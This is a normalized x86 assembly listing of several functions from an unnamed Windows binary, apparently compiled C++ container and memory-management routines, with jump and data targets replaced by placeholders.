push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
cmp esi edi
je r-xdata
pop edi
mov eax esi
pop esi
mov esp ebp
pop ebp
retn 0x4
mov ecx [ edi + 0x4 ]
sub ecx [ edi ]
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
mov [ ebp + 0x8 ] eax
jne r-xdata
mov ecx [ esi + 0x4 ]
push ebx
mov ebx [ esi ]
sub ecx ebx
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
cmp [ ebp + 0x8 ] ecx
ja r-xdata
mov eax [ esi + 0x4 ]
mov ecx [ esi ]
cmp ecx eax
je r-xdata
mov edx [ esi + 0x8 ]
sub edx ebx
mov [ ebp - 0x4 ] edx
mov eax 0x92492493
imul edx
add edx [ ebp - 0x4 ]
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp [ ebp + 0x8 ] eax
ja r-xdata
mov eax [ edi + 0x4 ]
push ebx
push eax
mov eax [ edi ]
push eax
call sub_4041b0
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx [ esi + 0x4 ]
lea edx [ esi + 0xc ]
push edx
push ecx
push eax
call sub_402460
mov ecx [ edi + 0x4 ]
sub ecx [ edi ]
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
add esp 0x1c
lea edx [ eax * 8 ]
sub edx eax
mov eax [ esi ]
pop ebx
lea ecx [ eax + edx * 4 ]
pop edi
mov [ esi + 0x4 ] ecx
mov eax esi
pop esi
mov esp ebp
pop ebp
retn 0x4
mov edx [ ebp + 0x8 ]
push edx
push ecx
push eax
push eax
call sub_4041e0
mov edx [ esi + 0x4 ]
mov edi eax
mov eax [ ebp + 0x8 ]
push eax
lea ecx [ esi + 0xc ]
push ecx
push edx
push edi
call sub_402460
add esp 0x20
mov [ esi + 0x4 ] edi
pop edi
mov eax esi
pop esi
mov esp ebp
pop ebp
retn 0x4
test ebx ebx
je r-xdata
mov eax [ edi ]
lea edx [ ecx * 8 ]
sub edx ecx
lea ecx [ eax + edx * 4 ]
push ebx
push ecx
push eax
mov [ ebp + 0x8 ] ecx
call sub_4041b0
mov ecx [ ebp + 0x8 ]
mov eax [ esi + 0x4 ]
mov edi [ edi + 0x4 ]
push ecx
lea edx [ esi + 0xc ]
push edx
push eax
mov eax [ ebp + 0x8 ]
push edi
push eax
call sub_404270
add esp 0x20
pop ebx
mov [ esi + 0x4 ] eax
pop edi
mov eax esi
pop esi
mov esp ebp
pop ebp
retn 0x4
mov ecx [ edi + 0x4 ]
sub ecx [ edi ]
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
push eax
mov ecx esi
call sub_401430
test al al
je r-xdata
mov eax [ esi + 0x4 ]
push eax
push ebx
mov ecx esi
call sub_402560
mov ecx [ esi ]
push ecx
call sub_41a0d6
add esp 0x4
pop ebx
mov edx [ esi ]
mov eax [ edi + 0x4 ]
mov ecx [ edi ]
push edx
push eax
push ecx
mov ecx esi
call sub_4048b0
mov [ esi + 0x4 ] eax
sub_4050f0
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi ecx
mov eax [ edi + 0x4 ]
cmp esi eax
jae r-xdata
cmp eax [ edi + 0x8 ]
jne r-xdata
mov ecx [ edi ]
cmp ecx esi
ja r-xdata
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
push 0x1
mov ecx edi
call sub_404c20
sub esi ecx
sar esi 0x3
cmp eax [ edi + 0x8 ]
jne r-xdata
add [ edi + 0x4 ] 0x8
pop edi
pop esi
pop ebp
retn 0x4
mov [ eax ] 0x0
mov [ eax + 0x4 ] 0x0
cmp eax esi
je r-xdata
mov eax [ edi ]
lea ecx [ eax + esi * 8 ]
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
push 0x1
mov ecx edi
call sub_404c20
mov edx [ esi + 0x4 ]
mov ecx [ eax + 0x4 ]
mov [ eax + 0x4 ] edx
mov [ esi + 0x4 ] ecx
mov edx [ esi ]
mov ecx [ eax ]
mov [ eax ] edx
mov [ esi ] ecx
mov [ eax ] 0x0
mov [ eax + 0x4 ] 0x0
cmp eax ecx
je r-xdata
mov esi [ ecx + 0x4 ]
mov edx [ eax + 0x4 ]
mov [ eax + 0x4 ] esi
mov [ ecx + 0x4 ] edx
mov esi [ ecx ]
mov edx [ eax ]
mov [ eax ] esi
mov [ ecx ] edx
add [ edi + 0x4 ] 0x8
pop edi
pop esi
pop ebp
retn 0x4
sub_4051a0
push ebp
mov ebp esp
push ebx
mov ebx [ ecx ]
push esi
mov esi [ ecx + 0x4 ]
sub esi ebx
mov eax 0x92492493
imul esi
mov eax [ ebp + 0x8 ]
add edx esi
sar edx 0x4
mov esi edx
shr esi 0x1f
add esi edx
mov edx 0x9249249
sub edx eax
push edi
cmp edx esi
jae r-xdata
mov edi [ ecx + 0x8 ]
add esi eax
sub edi ebx
mov eax 0x92492493
imul edi
add edx edi
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp esi eax
jbe r-xdata
push r--data
call sub_4194e6
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov edx eax
shr edx 0x1
mov edi 0x9249249
sub edi edx
cmp edi eax
jae r-xdata
add eax edx
xor eax eax
jmp r-xdata
push eax
call sub_404c80
mov eax esi
cmp eax esi
jae r-xdata
sub_405220
push ebp
mov ebp esp
push 0xffffffff
push sub_42d1a3
mov eax [ fs : 0x0 ]
push eax
sub esp 0x34
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov ebx [ edi + 0x28 ]
sub ebx [ edi + 0x24 ]
xor esi esi
sar ebx 0x2
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x14 ] 0xa
mov [ ebp - 0x40 ] esi
mov [ ebp - 0x3c ] esi
mov [ ebp - 0x38 ] esi
mov ecx [ edi + 0x4c ]
mov edx [ edi + 0x50 ]
sub edx ecx
mov eax 0x66666667
imul edx
sar edx 0x3
mov eax edx
shr eax 0x1f
add eax edx
mov [ ebp - 0x4 ] esi
mov [ ebp - 0xd ] 0x0
je r-xdata
mov ecx [ ebp - 0x14 ]
lea edx [ ebx + ecx - 0x1 ]
lea ebx [ edx + ebx * 2 - 0x2 ]
push 0x1
push ebx
mov [ ebp - 0x14 ] ebx
call sub_41acef
mov ebx eax
add esp 0x8
mov [ ebp - 0x28 ] ebx
test ebx ebx
jne r-xdata
mov edi edi
mov edx [ edi ]
mov eax [ edx + 0xc ]
mov ecx edi
call eax
mov [ ebx ] ax
mov ecx [ edi + 0x5c ]
lea esi [ ebx + 0x2 ]
mov [ esi ] ecx
mov edx [ edi + 0x60 ]
mov ecx [ ebp - 0x3c ]
mov [ esi + 0x4 ] edx
mov edx [ ebp - 0x40 ]
mov eax ecx
sub eax edx
sar eax 0x3
add esi 0x8
mov [ ebp - 0xd ] 0x0
mov [ ebp - 0x20 ] eax
test eax eax
je r-xdata
mov edi [ ebp - 0x40 ]
cmp edi esi
je r-xdata
mov al [ ebp - 0xd ]
mov ecx [ edi + 0x4c ]
mov edx [ edi + 0x50 ]
inc al
movzx esi al
mov [ ebp - 0xd ] al
sub edx ecx
mov eax 0x66666667
imul edx
sar edx 0x3
mov eax edx
shr eax 0x1f
add eax edx
cmp esi eax
jb r-xdata
mov eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x18 ]
lea edx [ eax + ecx + 0x1 ]
push 0x8
mov [ ebp - 0x14 ] edx
call sub_41ac18
xor ecx ecx
add esp 0x4
cmp eax ecx
je r-xdata
cmp edx ecx
je r-xdata
add ebx [ ebp - 0x14 ]
mov [ ebp - 0x18 ] ebx
xor ebx ebx
mov [ ebp - 0x4 ] 0xffffffff
test edi edi
je r-xdata
mov eax [ ebp - 0x28 ]
push eax
push edi
push esi
push esi
call sub_403d10
mov ecx [ ebp - 0x28 ]
push ecx
lea edx [ ebp - 0x34 ]
push edx
mov ebx eax
push esi
push ebx
call sub_403d90
add esp 0x20
mov [ ebp - 0x3c ] ebx
mov esi ebx
lea edx [ ebp - 0x18 ]
push edx
sub esp 0x14
lea eax [ esi + esi * 4 ]
mov dx [ ecx + eax * 4 ]
lea eax [ ecx + eax * 4 ]
mov ecx esp
mov [ ecx ] dx
movzx edx [ eax + 0x2 ]
mov [ ecx + 0x2 ] dl
movzx edx [ eax + 0x3 ]
add eax 0x4
mov [ ebp - 0x28 ] esp
mov [ ecx + 0x3 ] dl
push eax
add ecx 0x4
mov [ ebp - 0x18 ] 0x0
call sub_402580
mov ecx edi
call sub_404a20
mov esi eax
test esi esi
je r-xdata
mov esi [ ebp - 0x3c ]
xor eax eax
mov edx [ ebp - 0x18 ]
mov [ eax ] esi
mov [ eax + 0x4 ] edx
jmp r-xdata
mov eax 0x1
mov [ ebp - 0xd ] 0x1
cmp [ ebp - 0x1c ] eax
jbe r-xdata
mov eax [ ebp - 0x28 ]
push eax
push edx
push ecx
push ecx
call sub_403d10
mov [ ebp - 0x28 ] eax
mov ecx [ ebp - 0x28 ]
push ecx
mov ecx [ ebp - 0x3c ]
lea edx [ ebp - 0x34 ]
push edx
push ecx
push eax
call sub_403d90
mov edx [ ebp - 0x28 ]
add esp 0x20
mov [ ebp - 0x3c ] edx
mov ebx [ ebp - 0x28 ]
mov edx [ ebp - 0x40 ]
mov ecx [ ebp - 0x3c ]
movzx eax [ rw-data ]
mov [ esi ] al
mov eax [ ecx + ebx * 8 ]
mov edx [ eax + 0x4 ]
mov ecx [ eax ]
push edx
push ecx
push edx
inc esi
push esi
call sub_41ad2f
mov eax [ ebp - 0x40 ]
mov ebx [ eax + ebx * 8 ]
mov al [ ebp - 0xd ]
add esi [ ebx + 0x4 ]
inc al
movzx ebx al
add esp 0x10
mov [ ebp - 0xd ] al
cmp ebx [ ebp - 0x20 ]
jb r-xdata
xor al al
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x28 ]
push eax
lea ecx [ ebp - 0x34 ]
push ecx
push esi
push edi
call sub_403d90
push edi
call sub_41a0d6
add esp 0x14
lea ecx [ esi + 0x4 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x2c ] ecx
push eax
lea ecx [ ebp - 0x30 ]
call sub_403340
lea eax [ ebp - 0x30 ]
push eax
lea ecx [ ebp - 0x40 ]
mov [ ebp - 0x4 ] 0x1
call sub_4050f0
mov esi [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
push 0x10
call sub_41ac18
mov esi eax
add esp 0x4
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x4 ] 0x2
test esi esi
je r-xdata
lea ecx [ esi + 0x2 ]
mov [ ebp - 0x18 ] ecx
lea ebx [ ebx ]
mov ecx [ ebp - 0x40 ]
mov eax [ ecx + ebx * 8 ]
mov edx [ eax + 0x4 ]
add edx esi
cmp edx [ ebp - 0x18 ]
ja r-xdata
mov eax [ esi ]
mov edx [ eax ]
mov ecx esi
call edx
lea eax [ esi + 0x8 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
xor esi esi
movzx eax [ rw-data ]
mov edx [ edi ]
mov [ ebp - 0x28 ] eax
mov eax [ edx + 0xc ]
mov ecx edi
call eax
mov cl [ ebp - 0x28 ]
mov edx [ ebp - 0x14 ]
movzx eax ax
mov [ esi + 0x4 ] ax
mov [ esi + 0x6 ] 0x1
mov [ esi + 0x7 ] cl
mov [ esi + 0x8 ] ebx
mov [ esi + 0xc ] edx
mov [ esi ] 0x0
jmp r-xdata
mov al [ ebp - 0xd ]
inc al
mov [ ebp - 0xd ] al
movzx eax al
cmp eax [ ebp - 0x1c ]
jb r-xdata
mov ecx [ ebp - 0x14 ]
lea edx [ ebx + ecx ]
mov ecx [ ebp - 0x18 ]
cmp ecx edx
ja r-xdata
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx esi
call eax
mov esi [ ebp - 0x20 ]
sub esp 0x8
mov eax esp
mov [ ebp - 0x28 ] esp
mov [ ebp - 0x28 ] eax
mov [ eax ] 0x0
mov [ eax + 0x4 ] 0x0
test esi esi
je r-xdata
mov eax [ eax ]
mov ecx [ ebp - 0x24 ]
mov [ ecx ] eax
xor eax eax
push esi
lea ecx [ ebp - 0x24 ]
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] eax
call sub_403140
mov eax [ edi + 0x38 ]
mov [ ebp - 0x4 ] 0x3
cmp eax [ edi + 0x3c ]
je r-xdata
mov edx [ edi + 0x24 ]
mov eax [ edx + eax * 4 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0xc ]
call eax
movzx eax ax
test ax ax
je r-xdata
mov dl [ rw-data ]
mov [ esi ] dl
mov [ esi + 0x1 ] ax
add esi 0x3
add ecx 0x3
mov [ ebp - 0x18 ] ecx
mov ecx edi
call sub_403df0
mov [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
mov ecx [ esi + 0x4 ]
lea edx [ esi + 0x4 ]
test ecx ecx
je r-xdata
mov esi [ ebp - 0x40 ]
mov [ ebp - 0x4 ] 0xffffffff
test esi esi
je r-xdata
lea edx [ esi + 0x4 ]
or eax 0xffffffff
[ edx ] eax
jne r-xdata
mov esi [ ebp - 0x20 ]
lea esi [ ecx + 0x1 ]
mov ebx edx
mov eax ecx
[ ebx ] esi
cmp eax ecx
je r-xdata
mov al 0x1
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x28 ]
mov edx [ ebp - 0x3c ]
push eax
lea ecx [ ebp - 0x34 ]
push ecx
push edx
push esi
call sub_403d90
push esi
call sub_41a0d6
add esp 0x14
mov edx [ esi ]
mov eax [ edx ]
mov ecx esi
call eax
lea ecx [ esi + 0x8 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov ebx [ ebp - 0x28 ]
mov esi [ ebx + 0x4 ]
test esi esi
je r-xdata
mov ecx [ edx ]
test ecx ecx
jne r-xdata
mov eax [ esi ]
mov edx [ eax + 0x4 ]
mov ecx esi
call edx
mov esi [ ebp - 0x20 ]
mov ecx [ ebp - 0x24 ]
mov [ ebx + 0x4 ] esi
mov [ ebx ] ecx
jmp r-xdata
lea ecx [ esi + 0x4 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov eax [ esi ]
mov edx [ eax ]
mov ecx esi
call edx
lea eax [ esi + 0x8 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx esi
call eax
sub_4056a0
push ebp
mov ebp esp
push 0xffffffff
push sub_42d392
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov ecx [ edi + 0x4 ]
mov esi [ ebp + 0x8 ]
cmp esi ecx
jae r-xdata
cmp ecx [ edi + 0x8 ]
jne r-xdata
mov eax [ edi ]
cmp eax esi
ja r-xdata
mov ecx [ edi + 0x4 ]
mov [ ebp + 0x8 ] ecx
mov [ ebp - 0x10 ] ecx
xor edx edx
mov [ ebp - 0x4 ] 0x1
cmp ecx edx
je r-xdata
push 0x1
mov ecx edi
call sub_4051a0
sub esi eax
mov eax 0x92492493
imul esi
add edx esi
sar edx 0x4
mov esi edx
shr esi 0x1f
add esi edx
cmp ecx [ edi + 0x8 ]
jne r-xdata
add [ edi + 0x4 ] 0x1c
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
push 0xffffffff
xor eax eax
push edx
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] edx
mov [ ecx ] ax
push esi
mov ecx [ edi ]
lea eax [ esi * 8 ]
sub eax esi
lea eax [ ecx + eax * 4 ]
mov ecx [ edi + 0x4 ]
mov [ ebp + 0x8 ] ecx
mov [ ebp - 0x10 ] ecx
xor edx edx
mov [ ebp - 0x4 ] edx
cmp ecx edx
je r-xdata
push 0x1
mov ecx edi
call sub_4051a0
push 0xffffffff
xor esi esi
push edx
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] edx
mov [ ecx ] si
push eax
jmp r-xdata
call sub_401ae0
sub_405790
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push ebx
mov ebx [ ebp + 0xc ]
cmp eax ebx
je r-xdata
mov eax [ ebp + 0x10 ]
pop ebx
pop ebp
retn
push esi
push edi
mov edi [ ebp + 0x10 ]
lea esi [ eax + 0x3 ]
mov ax [ esi - 0x3 ]
mov [ edi ] ax
mov cl [ esi - 0x1 ]
mov [ edi + 0x2 ] cl
mov dl [ esi ]
lea eax [ esi + 0x1 ]
push eax
lea ecx [ edi + 0x4 ]
mov [ edi + 0x3 ] dl
call sub_404f40
add esi 0x14
lea ecx [ esi - 0x3 ]
add edi 0x14
cmp ecx ebx
jne r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn
sub_4057e0
push ebp
mov ebp esp
push 0xffffffff
push sub_42d1d0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x3c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
xor ebx ebx
mov [ ebp - 0x44 ] ebx
xor ecx ecx
mov [ ebp - 0x48 ] esi
mov [ ebp - 0x40 ] ecx
mov [ ebp - 0x3c ] ebx
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x34 ] ebx
mov edi [ rw-data ]
mov ecx [ ebp + 0x10 ]
mov [ ebp - 0x4 ] ebx
cmp ecx edi
jae r-xdata
mov edx [ rw-data ]
mov dx [ eax + edx ]
mov [ ebp - 0x40 ] dx
mov edx [ rw-data ]
movzx edx [ eax + edx ]
mov [ ebp - 0x3e ] dl
mov edx [ rw-data ]
movzx edx [ eax + edx ]
add eax edi
xor edi edi
mov [ ebp - 0x3d ] dl
cmp ecx ebx
jbe r-xdata
lea eax [ ebp - 0x3c ]
xor edx edx
push eax
lea ecx [ esi + 0x4 ]
mov [ esi ] edx
call sub_402580
jmp r-xdata
mov dx [ ebp - 0x40 ]
mov cl [ ebp - 0x3d ]
mov al [ ebp - 0x3e ]
mov [ esi ] dx
lea edx [ ebp - 0x3c ]
mov [ esi + 0x3 ] cl
push edx
lea ecx [ esi + 0x4 ]
mov [ esi + 0x2 ] al
call sub_402580
mov edi [ ebp - 0x3c ]
cmp edi ebx
je r-xdata
mov esi eax
mov edi edi
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_41ac09
mov esp ebp
pop ebp
retn 0xc
mov eax [ ebp - 0x44 ]
mov edx [ ebp - 0x38 ]
push eax
lea ecx [ ebp - 0x30 ]
push ecx
push edx
push edi
call sub_402460
push edi
call sub_41a0d6
add esp 0x14
inc edi
inc esi
cmp edi [ ebp + 0x10 ]
jb r-xdata
inc esi
inc edi
xor edx edx
mov eax esi
mov [ ebp - 0x2c ] dx
mov [ ebp - 0x18 ] 0x7
mov [ ebp - 0x1c ] ebx
lea edx [ eax + 0x2 ]
movzx eax [ esi ]
movsx ecx [ rw-data ]
cmp eax ecx
jne r-xdata
mov esi [ ebp - 0x48 ]
mov cx [ eax ]
add eax 0x2
cmp cx bx
jne r-xdata
sub eax edx
sar eax 0x1
push eax
push esi
lea ecx [ ebp - 0x2c ]
call sub_403650
lea eax [ ebp - 0x2c ]
push eax
lea ecx [ ebp - 0x3c ]
mov [ ebp - 0x4 ] 0x1
call sub_4056a0
cmp [ ebp - 0x18 ] 0x8
mov [ ebp - 0x4 ] bl
jb r-xdata
mov ecx [ ebp - 0x2c ]
push ecx
call sub_41a0d6
add esp 0x4
sub_405950
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x0
mov [ esi + 0xc ] 0x0
pop esi
pop ebp
retn
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ esi + 0x8 ]
lea edx [ esi + 0x10 ]
push edx
push ecx
push eax
call sub_402460
mov edx [ esi + 0x4 ]
push edx
call sub_41a0d6
add esp 0x14
sub_4059a0
push ebp
mov ebp esp
push 0xffffffff
push sub_42d211
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
xor ebx ebx
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x4 ] ebx
lea esp [ esp ]
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp + 0x8 ] esi
mov [ ebp - 0x4 ] 0x1
cmp esi ebx
je r-xdata
add esi 0x14
mov [ ebp - 0x4 ] bl
mov [ ebp + 0x10 ] esi
add edi 0x14
jmp r-xdata
mov ax [ edi ]
mov [ esi ] ax
mov cl [ edi + 0x2 ]
mov [ esi + 0x2 ] cl
mov dl [ edi + 0x3 ]
lea eax [ edi + 0x4 ]
push eax
lea ecx [ esi + 0x4 ]
mov [ esi + 0x3 ] dl
call sub_402580
cmp edi [ ebp + 0xc ]
je r-xdata
sub_405a1c
mov esi [ ebp - 0x14 ]
mov edi [ ebp + 0x10 ]
cmp esi edi
je r-xdata
xor ebx ebx
push ebx
push ebx
call sub_41ac98
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ebx [ ebp + 0x14 ]
lea esp [ esp ]
push esi
push ebx
call sub_405950
add esi 0x14
add esp 0x8
cmp esi edi
jne r-xdata
sub_405a60
push ebp
mov ebp esp
push 0xffffffff
push sub_42d24b
mov eax [ fs : 0x0 ]
push eax
sub esp 0x30
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov [ ebp - 0x10 ] edi
xor ebx ebx
mov [ ebp - 0x14 ] ebx
xor eax eax
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x1c ] ebx
push 0x18
mov [ ebp - 0x4 ] ebx
call sub_41ac18
add esp 0x4
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] 0x1
cmp eax ebx
je r-xdata
xor esi esi
mov ecx eax
call sub_412420
mov esi eax
jmp r-xdata
cmp edi ebx
jne r-xdata
mov ecx esi
call sub_412460
push esi
call sub_41a0d6
add esp 0x4
push 0xb
push rw-data
mov ecx esi
mov [ ebp - 0x4 ] bl
call sub_4124b0
push 0x8
push rw-data
mov ecx esi
call sub_412490
movzx ecx [ ebp + 0xc ]
push ecx
sub esp 0x1c
mov edx esp
mov [ ebp + 0xc ] esp
push edx
mov ecx esi
call sub_412790
mov ecx [ edi + 0x1c ]
mov eax [ ecx ]
mov edx [ eax + 0x4 ]
call edx
mov edi eax
cmp esi ebx
je r-xdata
mov edx [ ebp - 0x10 ]
mov ecx [ edx + 0x10 ]
mov eax [ ecx ]
mov edx [ eax + 0x8 ]
push edi
call edx
mov esi eax
mov eax [ edi ]
cmp eax ebx
je r-xdata
mov esi [ ebp + 0x8 ]
lea ecx [ ebp - 0x24 ]
xor eax eax
push ecx
lea ecx [ esi + 0x4 ]
mov [ esi ] eax
call sub_402580
jmp r-xdata
push edi
call sub_41a0d6
add esp 0x4
cmp esi ebx
je r-xdata
push eax
call sub_41a7eb
add esp 0x4
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ esi + 0xc ]
mov ecx [ esi + 0x8 ]
push eax
push ecx
mov ecx [ ebp - 0x10 ]
lea edx [ ebp - 0x3c ]
push edx
call sub_4057e0
mov cx [ eax ]
mov dl [ eax + 0x2 ]
mov [ ebp - 0x28 ] cx
mov cl [ eax + 0x3 ]
add eax 0x4
mov [ ebp - 0x25 ] cl
push eax
lea ecx [ ebp - 0x24 ]
mov [ ebp - 0x4 ] 0x2
mov [ ebp - 0x26 ] dl
call sub_404f40
mov eax [ ebp - 0x38 ]
mov [ ebp - 0x4 ] bl
cmp eax ebx
je r-xdata
mov eax [ esi + 0x8 ]
cmp eax ebx
je r-xdata
mov edx [ ebp + 0xc ]
push edx
mov edx [ ebp - 0x34 ]
lea ecx [ ebp - 0x2c ]
push ecx
push edx
push eax
call sub_402460
mov eax [ ebp - 0x38 ]
push eax
call sub_41a0d6
add esp 0x14
push esi
call sub_41a0d6
mov esi [ ebp + 0x8 ]
mov cx [ ebp - 0x28 ]
mov dl [ ebp - 0x26 ]
mov al [ ebp - 0x25 ]
mov [ esi ] cx
add esp 0x4
lea ecx [ ebp - 0x24 ]
push ecx
lea ecx [ esi + 0x4 ]
mov [ esi + 0x2 ] dl
mov [ esi + 0x3 ] al
call sub_402580
mov edi [ ebp - 0x24 ]
cmp edi ebx
je r-xdata
push eax
call sub_41a7eb
add esp 0x4
mov edx [ ebp + 0xc ]
mov ecx [ ebp - 0x20 ]
push edx
lea eax [ ebp - 0x18 ]
push eax
push ecx
push edi
call sub_402460
push edi
call sub_41a0d6
add esp 0x14
sub_405c40
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x8 ]
cmp edi [ ebp + 0xc ]
je r-xdata
pop edi
pop ebp
retn
push ebx
add edi 0x4
push esi
xor eax eax
mov [ edi ] eax
mov [ edi + 0x4 ] eax
mov [ edi + 0x8 ] eax
add edi 0x14
lea eax [ edi - 0x4 ]
cmp eax [ ebp + 0xc ]
jne r-xdata
mov ebx [ edi + 0x4 ]
cmp esi ebx
je r-xdata
mov esi [ edi ]
test esi esi
je r-xdata
pop esi
pop ebx
mov edx [ edi ]
push edx
call sub_41a0d6
add esp 0x4
mov edi edi
xor ecx ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] cx
add esi 0x1c
cmp esi ebx
jne r-xdata
mov eax [ esi ]
push eax
call sub_41a0d6
add esp 0x4
cmp [ esi + 0x14 ] 0x8
jb r-xdata
sub_405cb0
push ebp
mov ebp esp
push 0xffffffff
push sub_42d270
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi ecx
mov ebx [ ebp + 0x8 ]
cmp ebx 0xccccccc
jbe r-xdata
mov ecx [ esi + 0x8 ]
sub ecx [ esi ]
mov eax 0x66666667
imul ecx
sar edx 0x3
mov eax edx
shr eax 0x1f
add eax edx
cmp eax ebx
jae r-xdata
push r--data
call sub_4194e6
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea edi [ esi + 0xc ]
push ebx
mov ecx edi
call sub_403010
mov ebx [ ebp + 0x8 ]
mov ecx [ esi + 0x4 ]
mov edx [ esi ]
push ebx
push 0x0
push edi
push eax
push ecx
push edx
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] 0x0
call sub_4059a0
mov ebx [ esi ]
mov ecx [ esi + 0x4 ]
sub ecx ebx
mov eax 0x66666667
imul ecx
sar edx 0x3
mov edi edx
shr edi 0x1f
add esp 0x18
add edi edx
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
lea ecx [ eax + eax * 4 ]
mov eax [ ebp - 0x14 ]
lea edx [ eax + ecx * 4 ]
lea ecx [ edi + edi * 4 ]
mov [ esi + 0x8 ] edx
lea edx [ eax + ecx * 4 ]
mov [ esi + 0x4 ] edx
mov [ esi ] eax
mov ecx [ ebp + 0x8 ]
push ecx
lea eax [ esi + 0xc ]
push eax
mov eax [ esi + 0x4 ]
push eax
push ebx
call sub_405c40
mov edx [ esi ]
push edx
call sub_41a0d6
add esp 0x14
sub_405dc0
push ebp
mov ebp esp
push ecx
push esi
mov esi ecx
mov eax [ esi ]
test eax eax
je r-xdata
mov [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x0
pop esi
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
push ecx
mov ecx [ esi + 0x4 ]
lea edx [ esi + 0xc ]
push edx
push ecx
push eax
call sub_405c40
mov edx [ esi ]
push edx
call sub_41a0d6
add esp 0x14
sub_405e10
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push esi
push eax
mov eax [ ebp + 0xc ]
mov esi ecx
mov ecx [ esi + 0x4 ]
